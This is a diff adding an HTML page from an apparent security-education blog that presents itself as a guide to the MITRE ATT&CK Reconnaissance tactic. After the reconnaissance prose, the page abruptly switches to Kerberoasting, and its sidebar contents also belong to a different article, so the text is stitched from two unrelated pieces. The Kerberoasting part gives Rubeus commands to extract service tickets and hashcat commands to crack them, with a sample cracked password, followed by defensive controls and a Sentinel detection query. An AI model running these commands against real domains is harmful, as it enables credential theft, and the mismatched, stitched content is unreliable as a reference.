@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MITRE ATT&CK Tactics - Reconnaissance (TA0043)</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body class="blog-layout">
+
+  <!-- Navbar -->
+  <header class="navbar">
+    <div class="navbar__brand">
+      <div class="helix-icon">HHW</div>
+      hackherway cybersecurity
+    </div>
+    <div class="navbar__search">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="color:var(--text-muted)"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
+      <input type="text" placeholder="Search documentation...">
+      <kbd>/</kbd>
+    </div>
+    <nav class="navbar__links">
+      <a href="index.html">Home</a>
+      <a href="#" class="active">Blog</a>
+      <a href="#">Whoami</a>
+      <a href="#">Contact</a>
+    </nav>
+  </header>
+
+ <!-- Hero -->
+      <section class="hero fade-up">
+        <div class="hero__bg"></div>
+        <div class="hero__grid-overlay"></div>
+        <div class="hero__content">
+          <div class="hero__tag">
+            <span class="pulse"></span>
+            TA0043
+          </div>
+          <h1 class="hero__title">
+            <span class="glitch" data-text="Helix">MITRE ATT&CK TACTIC</span> <span class="pink">Reconnaissance</span><br>
+          </h1>
+          <p class="hero__desc">
+            Learn about Reconnaissance (TA0043), a MITRE ATT&CK tactic with 30 associated techniques. Beginner-friendly guide for security teams.
+          </p>
+          <div class="hero__actions">
+            <a href="blog-reconnaissance.html" class="btn btn--primary">Start Reading &#8594;</a>
+            <a href="#topics" class="btn btn--ghost">Browse Topics</a>
+          </div>
+        </div>
+      </section>
+
+
+  <div class="blog-container">
+    <!-- Main Article -->
+    <article class="blog-main">
+      <div class="blog-header">
+        <a href="index.html" class="blog-header__back">&#8592; Back to Documentation</a>
+        <h1 class="blog-header__title">TA0043 - Reconnaissance Tactics Dissected</h1>
+        <div class="blog-header__meta">
+          <span>&#128100; mindhackdiva</span>
+          <span>&#128197; March 21, 2026</span>
+          <span>&#9201; 12 min read</span>
+        </div>
+        <div class="blog-header__tags">
+          <span class="blog-tag">MITRE ATT&CK Tactics</span>
+          <span class="blog-tag">Cyber Defense</span>
+          <span class="blog-tag">Tactics, Techniques, Procedures (TTPs)</span>
+          <span class="blog-tag">Blue Team</span>
+          <span class="blog-tag">Defensive Operations</span>
+        </div>
+      </div>
+
+      <div class="blog-content">
+        <h2 id="introduction">Introduction to MITRE ATT&CK -  Reconnaissance (TA0043)</h2>
+<p>In the MITRE ATT&CK framework model, the Reconnaissance phase (TA0043) represents the deliberate, methodical collection of intelligence about a target prior to any direct or indirect compromise. This pre-attack, pre-compromise stage is not an afterthought or a preliminary step that can be rushed; it is the foundation upon which all subsequent adversarial actions depend. A well-executed reconnaissance effort reduces uncertainties, identifies viable attack pathways, and enables the adversary to tailor future attack operations with clarity and precision. At this stage, the adversary is not yet attempting to breach internal systems but is instead building a comprehensive dossier, or an understanding of the target's external presence, organizational structure, technical footprint, and human landscape. The output of reconnaissance is effectively an intelligence profile that informs decision-making throughout the rest of the intrusion and attack chain lifecycle.</p>
+        <h2 id="target-profiling">Target Profiling and Scope Definition</h2>
+<p>Reconnaissance typically begins with broad target profiling. The adversary first defines the scope of the organization, identifying not only the primary entity but also subsidiaries, partner organizations, recently acquired companies, and third-party service providers. This step is critical because modern enterprises rarely operate as isolated entities; instead, they exist within complex ecosystems of trust relationships. An adversary who understands these relationships can identify weaker or less-defended entry points, such as smaler subsidiaries or vendors with indirect access. Publicly available sources such as corporate websites, financial filings, press releases, and industry reports provide a surprising amount of insight into how an organization is structured and where its critical operations reside. Over time, this information allows the adversary to map business functions to technical assets, bridging the gap between organizational intent and infrastructure reality.</p>
+        <h2 id="intelligence">Identity and Personnel Intelligence</h2>
+<p>Parallel to organizational mapping, adversaries conduct extensive identity-focused reconnaissance. This involves collecting detailed information about employees, including names, roles, email formats, and reporting hierarchies. Public platforms such as social media sites, professional networking sites, such as LinkedIn, conference presentations, and technical blogs are often mined and scraped to identify individuals and sensitive positions, such as systems administrators, developers, security engineers, and executives. The adversary is not simply building a list of names because they feel like it; they are constructing a model of influence and access within the organization. By understanding who is who - who has authority, who has privileged access, and who interacts with critical systems - the adversary can later craft targeted social engineering campaigns or prioritize credential-based attacks. In many cases, this human-centric intelligence becomes more valuable than purely technical data because it enables attacks that bypass technical controls altogether.</p>
+        <h2 id="infrastructure-mapping">External Infrastructure Mapping</h2>
+<p>As the reconnaissance effort deepens, the focus shifts toward mapping the organization's external technical footprint. This includes identifying domains, subdomains, IP address ranges and zones, DNS records via WHOIS lookups, and hosting providers. Techniques such as DNS enumeration, certificate transparency log collection and analysis, and passive DNS correlation are used to uncover assets that may not be immediately visible through standard discovery methods. Organizations often maintain development, staging, or legacy systems that are not prominently linked from their primary web presence but remain accessible on the internet. These "hidden" assets frequently lack the same level of security hardening as production systems and therefore represent attractive targets. By correlating domain data with hosting infrastructure and network ownership records, the adversary builds a detailed map of the organization's overall attack surface.</p>
+        <h2 id="stack-identification">Technology Fingerprinting and Stack Identification</h2>
+<p>Once the external footprint is established, adversaries beging technology fingerprinting. This involves identifying the software stacks, frameworks, and services in use across the organization's exposed systems. Web servers, application frameworks, authentication mechanisms, and remote access solutions are all analyzed through passive observation and, when necessary, light active probing. Even subtle indicators, such as HTTP response headrs, TLS certificate metadata, or error messages, can reveal critical information about underlying technologies. This knowledge allows the adversary to align potential vulnerabilities with known exploits or misconfigurations. For example, identifying a specific version of a web server or application framework via banner grabbing can immediately narrow the search scope for exploitable weaknesses. Over time, this process transforms a generic target into a highly defined technical environment with known strengths and weaknesses.</p>
+        <h2 id="exposure-discovery">Exposure Discovery and Data Leakage Analysis</h2>
+<p>In addition to infrastructure and technology, adversaries place significant emphasis on discovering exposed data and misconfigurations. Publicly accessible storage repositories, such as cloud object storage buckets, are frequently examined for sensitive information. Code repositories are scrutinized for hardcoded credentials, API keys, and internal documentation that may inadvertently reveal system architecture or security controls. Even seemingly minor leaks, such as configuration files or debug logs, can provide valuable clues about authentication mechanisms, internal endpoints, or integration points with third-party services. This form of reconnaissance often blurs the line between passive and active techniques, as the adversary may interact with publicly exposed resources without directly targeting core systems. The cumulative effect is the gradual assembly of a detailed picture of how the organization operates at both a technical and a procedural level.</p>
+        <h2 id="active-reconnaissance">Transition to Active Reconnaissance</h2>
+<p>As reconnaissance progresses, adversaries may transition from purely passive collection to selective active probing. This shift is typically calculated and restrained, as active techniques introduce the risk of detection. Port scanning, service enumeration, and web application probing are used to validate assumptions and confirm the presence of specific services. Rather than indiscriminate scanning, mature adversaries focus on high-value targets identified during earlier phases, minimizing noise and reducing the likelihood of triggering alerts. The goal is not to map the entire network exhaustively but to confirm the accessibility and configuration of key ssytems that may serve as entry points. This targeted approach reflects a broader trend in modern adversarial behaviors, where precision and stealth are mainly prioritized over volume and speed.</p>
+        <h2 id="dependency-mapping">Trust Relationships and Dependency Mapping</h2>
+<p>An often overlooked aspect of reconnaissance is the mapping of trust relationships and dependencies. Organizations frequently rely on third-party services, Identity Providers (IdP), and external integrations to support their operations. By identifying these connections, an adversary can explore indirect attack pathways that bypass the primary target's defenses. For example, compromising a vendor with privileged access or exploiting weaknesses in a federated authentication system can provide a foothold without directly attacking the organization's core infrastructure. This type of reconnaissance requires a deeper level of analysis, as it involves understanding not just what systems exist, but how they interact and where implicit trust is granted.</p>
+        <h2 id="recon-output">Reconnaissance Output and Intelligence Consolidation</h2>
+<p>By the end of the reconnaissance phase, the adversary has assembled a comprehensive intelligence dataset. This dataset typically includes a catalog of domains and subdomains, a mapping of external services and technologies, a list of employees and their roles, and a thorough understanding of the organization's operational structure and dependencies. More importantly, it includes a prioritized set of potential entry points, each evaluated in terms of feasibility, risk, and potential impact. This prioritization is what transforms raw data into actionable and meaningful intelligence. Rather than approaching the target blindly, the adversary enters the next phase - Resource Development - with a clear strategy in-hand and a high probabiliy of success.</p>
+        <h2 id="detection-challenges">Detection Challenges and Limitations</h2>
+<p>From a defensive perspective, reconnaissance is one of the most challenging phases to detect and mitigate. Why? Because passive techniques leave no direct trace on the target's systems, as the data is gathered from third-party sources and public avenues. Even active techniques can be difficult to distinguish from legitimate traffic, particularly when conducted at low volume or distributed across multiple sources. As a result, traditional security controls often provide limited visibility into reconnaissance activities. Effective defense therefore focuses on reducing the amount of information made available to adversaries and continuously monitoring the organization's external attack surface. This includes auditing publicly accessible data, identifying and securing exposed assets, and tracking changes in the organization's digital footprint over time.</p>
+        <h2 id="continuous-reconnaissance">Continuous Reconnaissance and Adversary Persistence</h2>
+<p>Ultimately, reconnaissance is not a single action but an ongoing process that evolves alongside the target, and is one that can take many weeks to months and even years to complete. Organizations change, new assets are deployed, employees join and leave, and technologies are updated or deprecated. Skilled adversaries recognize this and treat reconnaissance as a continuous activity, revisiting targets periodically to refresh their intelligence and identify new opportunities. In this sense, reconnaissance is both the beginning of an attack and a persistent background activity that supports long-term operations. Its success determines not only whether an intrusion is possible, but how efficiently and stealthily it can be executed.</p>
+
+        <div class="callout callout--info">
+          <span class="callout__icon">&#x2139;&#xFE0F;</span>
+          <div>Kerberoasting requires only a valid domain user account — no elevated privileges are needed to request service tickets, making it a low-barrier, high-impact attack.</div>
+        </div>
+
+
+
+
+        <h3>Extract Tickets with Rubeus</h3>
+        <p>Rubeus is a C# toolset for Kerberos interaction and abuse. It can request and extract service tickets in a crackable format:</p>
+        <div class="code-block">
+          <div class="code-block__header">
+            <div class="code-block__dots"><span></span><span></span><span></span></div>
+            <span class="code-block__lang">cmd</span>
+            <button class="code-block__copy">Copy</button>
+          </div>
+<pre><span class="c-comment"># Request tickets for all kerberoastable accounts</span>
+<span class="c-cmd">Rubeus.exe</span> <span class="c-flag">kerberoast</span> <span class="c-flag">/outfile:</span><span class="c-string">hashes.txt</span>
+
+<span class="c-comment"># Target a specific SPN</span>
+<span class="c-cmd">Rubeus.exe</span> <span class="c-flag">kerberoast</span> <span class="c-flag">/spn:</span><span class="c-string">MSSQLSvc/db01.corp.local:1433</span>
+
+<span class="c-comment"># Use RC4 downgrade for easier cracking (noisier)</span>
+<span class="c-cmd">Rubeus.exe</span> <span class="c-flag">kerberoast</span> <span class="c-flag">/tgtdeleg</span></pre>
+        </div>
+
+        <h3>Crack with Hashcat</h3>
+        <div class="code-block">
+          <div class="code-block__header">
+            <div class="code-block__dots"><span></span><span></span><span></span></div>
+            <span class="code-block__lang">bash</span>
+            <button class="code-block__copy">Copy</button>
+          </div>
+<pre><span class="c-comment"># Crack Kerberos 5 TGS-REP (RC4 - type 23)</span>
+<span class="c-cmd">hashcat</span> <span class="c-flag">-m 13100</span> hashes.txt <span class="c-string">wordlist.txt</span> <span class="c-flag">-r rules/best64.rule</span>
+
+<span class="c-comment"># Crack AES256 tickets (type 17/18 — slower)</span>
+<span class="c-cmd">hashcat</span> <span class="c-flag">-m 19700</span> hashes.txt <span class="c-string">wordlist.txt</span> <span class="c-flag">--force</span>
+
+<span class="c-comment"># Check results</span>
+<span class="c-cmd">hashcat</span> <span class="c-flag">-m 13100</span> hashes.txt <span class="c-flag">--show</span>
+<span class="c-output">$krb5tgs$23$*svc_sql$CORP.LOCAL*$...:Summer2024!</span></pre>
+        </div>
+
+        <div class="callout callout--danger">
+          <span class="callout__icon">&#x26A0;&#xFE0F;</span>
+          <div><strong>Legal Notice:</strong> Only perform Kerberoasting attacks against systems you are authorized to test. Unauthorized access to computer systems is a criminal offense under laws such as the CFAA (US) and Computer Misuse Act (UK).</div>
+        </div>
+
+        <h2 id="detection">Detection &amp; Defense</h2>
+        <p>Defending against Kerberoasting requires a multi-layered approach combining preventive controls and detection mechanisms:</p>
+
+        <h3>Preventive Controls</h3>
+        <ul>
+          <li><strong>Strong service account passwords:</strong> Use 25+ character randomly generated passwords for all service accounts with SPNs</li>
+          <li><strong>Group Managed Service Accounts (gMSA):</strong> Automatically rotate 240-character complex passwords every 30 days</li>
+          <li><strong>AES encryption only:</strong> Disable RC4_HMAC_MD5 via GPO to force AES256, making cracking computationally expensive</li>
+          <li><strong>Minimize SPNs:</strong> Audit and remove unnecessary SPNs from user accounts; use computer accounts where possible</li>
+          <li><strong>Privileged Access Management:</strong> Avoid assigning Domain Admin or high-privilege group memberships to service accounts</li>
+        </ul>
+        <div class="code-block">
+          <div class="code-block__header">
+            <div class="code-block__dots"><span></span><span></span><span></span></div>
+            <span class="code-block__lang">KQL (Microsoft Sentinel)</span>
+            <button class="code-block__copy">Copy</button>
+          </div>
+<pre><span class="c-comment">// Detect potential Kerberoasting via RC4 TGS requests</span>
+<span class="c-cmd">SecurityEvent</span>
+| <span class="c-keyword">where</span> EventID == <span class="c-string">4769</span>
+| <span class="c-keyword">where</span> TicketEncryptionType == <span class="c-string">"0x17"</span>   <span class="c-comment">// RC4</span>
+| <span class="c-keyword">where</span> ServiceName !endswith <span class="c-string">"$"</span>         <span class="c-comment">// Exclude machine accounts</span>
+| <span class="c-keyword">summarize</span> Count=<span class="c-cmd">count</span>() <span class="c-keyword">by</span> TargetUserName, IpAddress, <span class="c-cmd">bin</span>(TimeGenerated, <span class="c-string">5m</span>)
+| <span class="c-keyword">where</span> Count > <span class="c-string">5</span></pre>
+        </div>
+
+    </article>
+
+    <!-- Right TOC -->
+    <aside class="toc-sidebar">
+      <nav class="toc">
+        <div class="toc__title">On this page</div>
+        <a href="#overview" class="active">Overview</a>
+        <a href="#how-it-works">How Kerberoasting Works</a>
+        <a href="#prerequisites">Prerequisites</a>
+        <a href="#attack-steps">Step-by-Step Attack</a>
+        <a href="#detection">Detection &amp; Defense</a>
+        <a href="#tools">Tools Used</a>
+        <a href="#references">References</a>
+      </nav>
+    </aside>
+  </div>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="footer__inner">
+    <center>
+    <img src="https://pixelsafari.neocities.org/dividers/rainbowstars4.gif" alt="">
+    <img src="https://pixelsafari.neocities.org/dividers/rainbowstars4.gif" alt="">
+    </center>
+    <div class="footer__left">&copy;© 1996–2026 <strong>hackherway cybersecurity</strong>. Educational content only · No warranties implied</div>
+    <p class="footer-text">Built with curiosity, caffeine, and controlled paranoia</p>
+    <div class="footer__links">
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+    <a href="#">GitHub</a>
+    <a href="#">Contact</a>
+    <center>   · · ·
+    <div class="footer__center">&copy;· Stay Safe · Stay Vigilant · Stay Informed · Educational content only · No warranties implied ·</div>
+    <p>made with ❤️ by nullbrat • mindhackdiva</p>
+    <p> · s08 🩷 a02 · b10 💙 j25 · k08 💚 d14 · </p>
+    <center><img src="https://pixelsafari.neocities.org/dividers/rainbowstars4.gif" alt="">
+    <img src="https://pixelsafari.neocities.org/dividers/rainbowstars4.gif" alt="">
+    </center>
+    </div>
+    </div>
+    </footer>
+
+
+  <script src="script.js"></script>
+</body>
+</html>
